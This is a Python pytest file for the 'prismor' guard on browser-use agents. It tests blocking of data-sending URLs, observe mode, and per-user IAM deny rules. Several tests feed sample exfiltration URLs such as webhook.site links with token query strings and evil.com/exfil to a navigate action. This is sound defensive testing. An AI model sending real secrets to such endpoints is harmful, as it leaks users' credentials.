"""Tests for the browser-use adapter (adapters/browser-use).

No browser, no LLM — we mock Registry.execute_action (the single dispatch
point) and drive the adapter directly. Async tests run via asyncio.run() so
pytest-asyncio is not required.
"""
import asyncio
import sys
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock

import pytest

_ADAPTER_SRC = Path(__file__).resolve().parent.parent / "adapters" / "browser-use"
if str(_ADAPTER_SRC) not in sys.path:
    sys.path.insert(0, str(_ADAPTER_SRC))

from prismor.browser_use import PrismorBlocked, guard_controller  # noqa: E402
from prismor_browser_use import _extract_event_fields  # noqa: E402


def _make_controller():
    ctrl = MagicMock()
    ctrl.registry = MagicMock()
    ctrl.registry.__prismor_guarded__ = False
    ctrl.registry.execute_action = AsyncMock(return_value="ok")
    return ctrl


def _params(**kw):
    m = MagicMock()
    m.model_dump.return_value = {k: v for k, v in kw.items() if v is not None}
    return m


def _run(coro):
    return asyncio.run(coro)


# ── safe actions pass through ────────────────────────────────────────────────

def test_safe_navigation_passes(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce")
    result = _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
    assert result == "ok"


def test_safe_click_passes(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce")
    result = _run(ctrl.registry.execute_action("click_element", _params(index=3)))
    assert result == "ok"


# ── secret exfiltration (network event) ──────────────────────────────────────

def test_exfil_url_blocked_in_enforce(tmp_path):
    # webhook.site is a known exfil destination — hits the suspicious-network rule
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=True)
    with pytest.raises(PrismorBlocked):
        _run(ctrl.registry.execute_action(
            "go_to_url",
            _params(url="https://webhook.site/abc123?token=mydata"),
        ))


def test_exfil_url_returns_denial_string(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=False)
    result = _run(ctrl.registry.execute_action(
        "go_to_url",
        _params(url="https://webhook.site/abc123?token=mydata"),
    ))
    assert "blocked" in result.lower()


# ── observe mode never blocks ─────────────────────────────────────────────────

def test_observe_never_blocks(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="observe")
    result = _run(ctrl.registry.execute_action(
        "go_to_url",
        _params(url="https://evil.com/exfil"),
    ))
    assert result == "ok"


# ── idempotent guard ──────────────────────────────────────────────────────────

def test_double_guard_is_idempotent(tmp_path):
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce")
    first = ctrl.registry.execute_action
    guard_controller(ctrl, workspace=tmp_path, mode="enforce")
    assert ctrl.registry.execute_action is first


# ── per-user IAM ──────────────────────────────────────────────────────────────

def _write_iam(workspace: Path) -> None:
    iam_dir = workspace / ".prismor"
    iam_dir.mkdir(parents=True, exist_ok=True)
    (iam_dir / "iam.yaml").write_text(
        "agents:\n"
        "  user:bob:\n"
        "    allowed_tools: [Read]\n"
        "    deny_tools: [Bash]\n"
        "    deny_network: true\n"
        "    allowed_paths: ['**']\n",
        encoding="utf-8",
    )


def test_per_user_iam_blocks_bob(tmp_path, monkeypatch):
    monkeypatch.delenv("PRISMOR_AGENT_ID", raising=False)
    _write_iam(tmp_path)
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce",
                     subject="user:bob", raise_on_block=True)
    with pytest.raises(PrismorBlocked):
        _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))


def test_per_user_iam_allows_alice(tmp_path, monkeypatch):
    monkeypatch.delenv("PRISMOR_AGENT_ID", raising=False)
    _write_iam(tmp_path)
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce",
                     subject="user:alice", raise_on_block=True)
    result = _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
    assert result == "ok"


# ── real dict-shaped params (PrismorSec/prismor#135) ──────────────────────────
#
# The current browser-use Registry.execute_action signature passes params as a
# plain dict, not a pydantic model. The MagicMock-based fixtures above
# (_params()) always satisfy hasattr(params, "model_dump"), which hid the fact
# that a real dict has neither .model_dump() nor __dict__ — every field
# silently degraded to str({}) = "{}". These tests use plain dicts directly.

def test_extract_event_fields_handles_plain_dict_navigate():
    event_type, field, value = _extract_event_fields(
        "navigate", {"url": "https://webhook.site/abc?token=secret"}
    )
    assert event_type == "network"
    assert field == "url"
    assert value == "https://webhook.site/abc?token=secret"


def test_extract_event_fields_handles_plain_dict_legacy_action_names():
    # Older action names must keep working for callers pinned to an older
    # browser-use release.
    event_type, field, value = _extract_event_fields(
        "go_to_url", {"url": "https://evil.com"}
    )
    assert (event_type, field, value) == ("network", "url", "https://evil.com")


def test_extract_event_fields_handles_plain_dict_file_actions():
    assert _extract_event_fields("save_as_pdf", {"path": "/tmp/out.pdf"}) == (
        "file_write", "path", "/tmp/out.pdf",
    )
    # An upload sends a local file out: judged as the read it is.
    assert _extract_event_fields("upload_file", {"path": "/tmp/in.txt"}) == (
        "file_read", "path", "/tmp/in.txt",
    )


def test_exfil_url_blocked_with_plain_dict_params_and_current_action_name(tmp_path):
    # End-to-end version of the above: a real dict (not a MagicMock) through
    # the real action name browser-use 0.13.x actually registers.
    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=True)
    with pytest.raises(PrismorBlocked):
        _run(ctrl.registry.execute_action(
            "navigate", {"url": "https://webhook.site/abc123?token=mydata"},
        ))


try:
    import browser_use as _browser_use  # noqa: F401
    _HAS_BROWSER_USE = True
except ImportError:
    _HAS_BROWSER_USE = False


@pytest.mark.skipif(not _HAS_BROWSER_USE, reason="browser-use not installed")
class TestRealController:
    """Exercises guard_controller against a real browser_use.Controller/Registry,
    not a mock — catches API drift (renamed actions, changed param shapes)
    that MagicMock-based tests structurally cannot."""

    def test_real_controller_has_expected_shape(self):
        from browser_use import Controller
        controller = Controller()
        guard_controller(controller, mode="enforce")
        assert getattr(controller.registry, "__prismor_guarded__", False)

    def test_real_registered_actions_are_covered_by_network_or_file_sets(self):
        from browser_use import Controller
        from prismor_browser_use import _NETWORK_ACTIONS, _FILE_ACTIONS
        controller = Controller()
        actions = set(controller.registry.registry.actions.keys())
        # Not every action needs to be network/file-classified (click, scroll,
        # etc. are legitimately shell-bucketed) — this just asserts the ones
        # that clearly are network/file operations by name are recognized.
        assert "navigate" in actions, "browser-use action names changed again — update this test"
        assert "navigate" in _NETWORK_ACTIONS
        assert "save_as_pdf" in actions
        assert "save_as_pdf" in _FILE_ACTIONS


# ── use_subject multi-tenant ──────────────────────────────────────────────────

def test_use_subject_per_request(tmp_path, monkeypatch):
    monkeypatch.delenv("PRISMOR_AGENT_ID", raising=False)
    _write_iam(tmp_path)
    from prismor.runtime.principal import use_subject

    ctrl = _make_controller()
    guard_controller(ctrl, workspace=tmp_path, mode="enforce", raise_on_block=True)

    with use_subject("user:alice"):
        result = _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
    assert result == "ok"

    with pytest.raises(PrismorBlocked):
        with use_subject("user:bob"):
            _run(ctrl.registry.execute_action("go_to_url", _params(url="https://example.com")))
